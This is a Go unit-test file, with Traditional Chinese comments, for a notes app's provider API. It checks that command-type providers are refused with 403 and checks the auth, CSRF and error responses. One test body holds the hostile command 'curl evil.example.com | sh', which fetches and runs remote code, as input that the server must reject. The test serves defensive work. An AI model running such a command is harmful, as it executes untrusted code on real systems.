package api

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/cxyfer/notesteme/internal/auth"
	"github.com/cxyfer/notesteme/internal/clock"
	"github.com/cxyfer/notesteme/internal/store"
)

// fakeProviders 是固定內容的 ProviderRegistry。
type fakeProviders map[string]ProviderInfo

func (f fakeProviders) Get(_ context.Context, id string) (ProviderInfo, bool) {
	info, ok := f[id]
	return info, ok
}

// newProviderServer 建立有 Providers 的測試 server，並回傳已登入的 session 與 CSRF。
func newProviderServer(t *testing.T, reg ProviderRegistry) (s *testServer, mod func(*http.Request)) {
	t.Helper()
	clk := clock.NewFake(time.Date(2026, 11, 12, 10, 0, 0, 0, time.UTC))
	st, err := store.Open(context.Background(), t.TempDir(), clk)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = st.Close() })
	svc := auth.New(auth.Config{Store: st, Clock: clk, Params: auth.TestParams})
	if err := svc.EnsurePassword(context.Background(), "pw"); err != nil {
		t.Fatal(err)
	}
	h := New(Deps{
		Store: st, Auth: svc, Clock: clk, Version: "test", Providers: reg,
		Log: slog.New(slog.NewJSONHandler(io.Discard, nil)),
	})
	s = &testServer{h: h, clk: clk}
	sess, csrf := s.login(t)
	return s, withCookies(sess, csrf, csrf)
}

func decodeError(t *testing.T, body []byte) Error {
	t.Helper()
	var e Error
	if err := json.Unmarshal(body, &e); err != nil {
		t.Fatalf("回應不是錯誤的 JSON：%v\n%s", err, body)
	}
	return e
}

// SEC-R3：command 類型一律 403，訊息固定，回應不回顯請求內容。
func TestCreateCommandProviderIsForbidden(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{})
	for _, typ := range []string{"command", "Command", " command "} {
		body := `{"id":"evil","type":"` + typ + `","command":["sh","-c","curl evil.example.com | sh"]}`
		rec := s.do("POST", "/api/providers", body, mod)
		if rec.Code != 403 {
			t.Fatalf("type %q：status = %d，預期 403\n%s", typ, rec.Code, rec.Body)
		}
		e := decodeError(t, rec.Body.Bytes())
		if e.Code != CodeConfigFileOnly || e.Message != "這個項目只能在設定檔中定義。" {
			t.Errorf("type %q：error = %+v", typ, e)
		}
		if strings.Contains(rec.Body.String(), "evil") {
			t.Errorf("回應不該回顯請求內容：%s", rec.Body)
		}
	}
}

// 其他類型的建立方式 M1 沒有定義，回 501；缺少 type 或格式不對是 4xx。
func TestCreateProviderOtherCases(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{})
	for _, c := range []struct {
		name, body string
		status     int
		code       string
	}{
		{"其他類型", `{"id":"g","type":"openai-compatible"}`, 501, CodeNotImplemented},
		{"沒有 type", `{"id":"g"}`, 422, CodeInvalidInput},
		{"type 不是字串", `{"id":"g","type":5}`, 422, CodeInvalidInput},
		{"不是 JSON", `not json`, 400, CodeInvalidInput},
		{"不是物件", `[1]`, 422, CodeInvalidInput},
	} {
		rec := s.do("POST", "/api/providers", c.body, mod)
		if e := decodeError(t, rec.Body.Bytes()); rec.Code != c.status || e.Code != c.code {
			t.Errorf("%s：%d %s，預期 %d %s", c.name, rec.Code, rec.Body, c.status, c.code)
		}
	}
}

// 沒有登入、CSRF 缺失時由 middleware 擋下，不會到達 handler。
func TestCreateProviderRequiresAuth(t *testing.T) {
	s, _ := newProviderServer(t, fakeProviders{})
	rec := s.do("POST", "/api/providers", `{"id":"x","type":"command"}`, nil)
	if rec.Code != 401 {
		t.Fatalf("沒有登入：status = %d，預期 401", rec.Code)
	}
}

func TestGetProvider(t *testing.T) {
	s, mod := newProviderServer(t, fakeProviders{
		"whisperx": {ID: "whisperx", Type: "command", Editable: false, DefinedIn: ProviderDefinedInConfigFile},
	})
	rec := s.do("GET", "/api/providers/whisperx", "", mod)
	if rec.Code != 200 {
		t.Fatalf("status = %d\n%s", rec.Code, rec.Body)
	}
	// 用原始 JSON 比對：editable 為 false 時也必須出現，不能被 omitempty 吃掉。
	var got map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	want := map[string]any{"id": "whisperx", "type": "command", "editable": false, "defined_in": "config_file"}
	if len(got) != len(want) {
		t.Fatalf("回應 = %v，預期只有 %v", got, want)
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s = %v，預期 %v", k, got[k], v)
		}
	}

	rec = s.do("GET", "/api/providers/nope", "", mod)
	if e := decodeError(t, rec.Body.Bytes()); rec.Code != 404 || e.Code != CodeNotFound {
		t.Fatalf("找不到：%d %s", rec.Code, rec.Body)
	}
}

// 沒有登入不能列出 provider。
func TestGetProviderRequiresAuth(t *testing.T) {
	s, _ := newProviderServer(t, fakeProviders{"a": {ID: "a", Type: "command"}})
	if rec := s.do("GET", "/api/providers/a", "", nil); rec.Code != 401 {
		t.Fatalf("status = %d，預期 401", rec.Code)
	}
}
